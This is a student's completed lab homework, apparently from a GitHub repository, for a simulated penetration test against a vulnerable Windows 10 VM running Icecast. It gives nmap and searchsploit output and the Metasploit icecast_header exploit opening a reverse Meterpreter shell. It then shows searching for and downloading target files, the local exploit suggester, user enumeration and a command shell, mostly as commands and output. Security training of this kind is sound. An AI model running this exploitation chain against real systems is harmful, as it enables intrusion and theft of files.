## Homework: Penetration Test Engagement

In this activity, you will play the role of an independent penetration tester hired by GoodCorp Inc. to perform security tests against their CEO’s workstation.

- The CEO claims to have passwords that are long and complex and therefore unhackable.

- You are tasked with gaining access to the CEO's computer and using a Meterpreter session to search for two files that contain the strings `recipe` and `seceretfile`.

- The deliverable for this engagement will be in the form of a report labeled `Report.docx`.

#### Setup 

- Before you begin, we'll need to start the Icecast server to emulate the CEO's computer. 
  - Log onto the DVW10 machine (credentials `IEUser:xxxxx`) and wait for the Icecast application to popup.
  - Then click `Start Server`. 

#### Reminders

- A penetration tester's job is not just to gain access and find a file. Pentesters need to find all vulnerabilities, and document and report them to the client. It's quite possible that the CEO's workstation has multiple vulnerabilities.
 
- If a specific exploit doesn't work, that doesn't necessarily mean that the target service isn't vulnerable. It's possible that something could be wrong with the exploit script itself. Remember, not all exploit scripts are right for every situation.
 
#### Scope
 
- The scope of this engagement is limited to the CEO's workstation only. You are not permitted to scan any other IP addresses or exploit anything other than the CEO's IP address.
 
- The CEO has a busy schedule and cannot have the computer offline for an extended period of time. Therefore, denial of service and brute force attacks are prohibited. 
 
- After you gain access to the CEO’s computer, you may read and access any file, but you cannot delete them. Nor are you allowed to make any configurations changes to the computer.
 
- Since you've already been provided access to the network, OSINT won't be necessary.
 
#### Lab Environment
 
For this week's homework, please use the following VM setup:
 
- Attacking machine: Kali Linux `root:xxx`
- Target machine: DVW10 `IEUser:xxx`

**NOTE**: You will need to login to the **DVW10** VM and start the `icecast` service prior to beginning this activity using the following procedure:

- After logging into DVW10, type "icecast" in the Cortana search box and hit **Enter**.
- The icecast application will launch.
- Click on **Start Server**.
- You are now ready to being the activity.

#### Deliverable

Once you complete this assignment, submit your findings in the following document: 

- [Report.docx] attached to this github repository: https://github.com/philippe75004/Penetration-Testing-1-Homework/blob/3b007de07f5a5b7e324a67a9bcaf553561f92f4c/Report-Homework%20Penetration%20Test%20Engagement.docx
 
### Instructions

You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: nmap -sV 192.168.0.20
	 
root@kali:/usr/share/nmap/scripts# nmap -sV 192.168.0.20
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-25 12:55 PDT
Nmap scan report for 192.168.0.20
Host is up (0.024s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          SLmail smtpd 5.5.0.4433
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  http          Icecast streaming media server
MAC Address: 00:15:5D:00:04:01 (Microsoft)
Service Info: Host: MSEDGEWIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds


*nmap vulnerabilities script scan:

root@kali:/usr/share/nmap/scripts# nmap --script rdp-ntlm-info.nse 192.168.0.20
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-25 12:53 PDT
Nmap scan report for 192.168.0.20
Host is up (0.011s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
25/tcp   open  smtp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
| rdp-ntlm-info:
|   Target_Name: MSEDGEWIN10
|   NetBIOS_Domain_Name: MSEDGEWIN10
|   NetBIOS_Computer_Name: MSEDGEWIN10
|   DNS_Domain_Name: MSEDGEWIN10
|   DNS_Computer_Name: MSEDGEWIN10
|   Product_Version: 10.0.17763
|_  System_Time: 2022-04-25T19:53:55+00:00
8000/tcp open  http-alt
MAC Address: 00:15:5D:00:04:01 (Microsoft)
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > Answer: searchsploit icecast
	 
	 root@kali:/usr/share/nmap/scripts# searchsploit icecast

![searchsploit icecast](/blob/main/Screenshots/Nmap.PNG "searchsploit icecast")
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Icecast 1.1.x/1.3.x - Directory Traversal                                                                                                                  | multiple/remote/20972.txt
Icecast 1.1.x/1.3.x - Slash File Name Denial of Service                                                                                                    | multiple/dos/20973.txt
Icecast 1.3.7/1.3.8 - 'print_client()' Format String                                                                                                       | windows/remote/20582.c
Icecast 1.x - AVLLib Buffer Overflow                                                                                                                       | unix/remote/21363.c
Icecast 2.0.1 (Win32) - Remote Code Execution (1)                                                                                                          | windows/remote/568.c
Icecast 2.0.1 (Win32) - Remote Code Execution (2)                                                                                                          | windows/remote/573.c
Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)                                                                                                | windows_x86/remote/16763.rb
Icecast 2.x - XSL Parser Multiple Vulnerabilities                                                                                                          | multiple/remote/25238.txt
icecast server 1.3.12 - Directory Traversal Information Disclosure                                                                                         | linux/remote/21602.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: msfdb init then msfconsole to access the console.
 
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: search Icecast and or search Icecast type:exploit

msf5 > search Icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


 
   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: use 0

msf5 > use 0
msf5 exploit(windows/http/icecast_header) >
 
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > Answer: set RHOSTS 192.168.0.20
RHOSTS => 192.168.0.20

 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: msf5 exploit(windows/http/icecast_header) > run

[*] Started reverse TCP handler on 192.168.0.8:4444
[*] Sending stage (180291 bytes) to 192.168.0.20
[*] Meterpreter session 1 opened (192.168.0.8:4444 -> 192.168.0.20:49731) at 2022-04-19 18:24:41 -0700

meterpreter >

   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: meterpreter > search -f *secretfile.txt
	 
Found 1 result...
    c:\Users\IEUser\Documents\user.secretfile.txt (161 bytes)
  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer: meterpreter > search -f *recipe.txt
	  
Found 1 result...
    c:\Users\IEUser\Documents\Drinks.recipe.txt (48 bytes)

 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:


      > Answer:  meterpreter > download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'
	  
[*] Downloading: c:\Users\IEUser\Documents\Drinks.recipe.txt -> Drinks.recipe.txt
[*] Downloaded 48.00 B of 48.00 B (100.0%): c:\Users\IEUser\Documents\Drinks.recipe.txt -> Drinks.recipe.txt
[*] download   : c:\Users\IEUser\Documents\Drinks.recipe.txt -> Drinks.recipe.txt

meterpreter > download 'c:\Users\IEUser\Documents\user.secretfile.txt'
[*] Downloading: c:\Users\IEUser\Documents\user.secretfile.txt -> user.secretfile.txt
[*] Downloaded 161.00 B of 161.00 B (100.0%): c:\Users\IEUser\Documents\user.secretfile.txt -> user.secretfile.txt
[*] download   : c:\Users\IEUser\Documents\user.secretfile.txt -> user.secretfile.txt
meterpreter >

 

8. You can also use Meterpreter's local exploit suggester to find possible exploits.

 
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 192.168.0.20 - Collecting local exploits for x86/windows...
[*] 192.168.0.20 - 30 exploit checks are being tried...
[+] 192.168.0.20 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 192.168.0.20 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.

 
#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer:meterpreter > run post/windows/gather/enum_logged_on_users

[*] Running against session 1

Current Logged Users
====================

 SID                                           User
 ---                                           ----
 S-1-5-21-321011808-3761883066-353627080-1000  MSEDGEWIN10\IEUser


[+] Results saved in: /root/.msf4/loot/20220419185306_default_192.168.0.20_host.users.activ_909007.txt

Recently Logged Users
=====================

 SID                                           Profile Path
 ---                                           ------------
 S-1-5-18                                      %systemroot%\system32\config\systemprofile
 S-1-5-19                                      %systemroot%\ServiceProfiles\LocalService
 S-1-5-20                                      %systemroot%\ServiceProfiles\NetworkService
 S-1-5-21-321011808-3761883066-353627080-1000  C:\Users\IEUser
 S-1-5-21-321011808-3761883066-353627080-1003  C:\Users\sysadmin
 S-1-5-21-321011808-3761883066-353627080-1004  C:\Users\vagrant


 
     
B. Open a Meterpreter shell. 
 
  > Answer: meterpreter > shell
Process 6380 created.
Channel 5 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>

 
C. Run the command that displays the target's computer system information:

   > Answer: C:\Program Files (x86)\Icecast2 Win32>systeminfo | more
systeminfo | more

Host Name:                 MSEDGEWIN10
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:
Registered Organization:   Microsoft
Product ID:                00329-20000-00001-AA236
Original Install Date:     3/19/2019, 4:59:35 AM
System Boot Time:          4/19/2022, 6:18:07 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2295 Mhz
BIOS Version:              American Megatrends Inc. 090007 , 5/18/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,066 MB
Available Physical Memory: 559 MB
Virtual Memory: Max Size:  3,346 MB
Virtual Memory: Available: 1,605 MB
Virtual Memory: In Use:    1,741 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\MSEDGEWIN10
Hotfix(s):                 11 Hotfix(s) Installed.
                           [01]: KB4601555
                           [02]: KB4465065
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4486153
                           [06]: KB4535680
                           [07]: KB4537759
                           [08]: KB4539571
                           [09]: KB4549947
                           [10]: KB5003243
                           [11]: KB5003171
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.0.20
                                 [02]: fe80::19ba:64e7:838c:b1b6
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
